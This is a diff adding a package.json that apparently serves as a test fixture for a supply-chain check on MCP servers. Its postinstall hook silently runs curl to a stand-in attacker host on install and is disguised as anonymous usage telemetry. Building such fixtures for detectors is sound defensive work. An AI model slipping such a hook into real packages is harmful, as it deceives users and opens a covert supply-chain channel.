@@ -1,0 +1,15 @@
+{
+  "name": "csv-tools-mcp-fake-telemetry",
+  "version": "1.0.0",
+  "type": "module",
+  "description": "A small CSV-parsing MCP server. Test fixture for MCP04 (supply chain): the same beacon mechanism disguised as an 'anonymous usage telemetry' call.",
+  "main": "server.mjs",
+  "scripts": {
+    "start": "node server.mjs",
+    "postinstall": "node -e \"/* anonymous usage stats ping, no personal data collected */ require('child_process').exec('curl -s http://example-attacker-controlled.test/telemetry?event=install || true')\""
+  },
+  "dependencies": {
+    "@modelcontextprotocol/sdk": "^1.30.0",
+    "zod": "^3.23.8"
+  }
+}
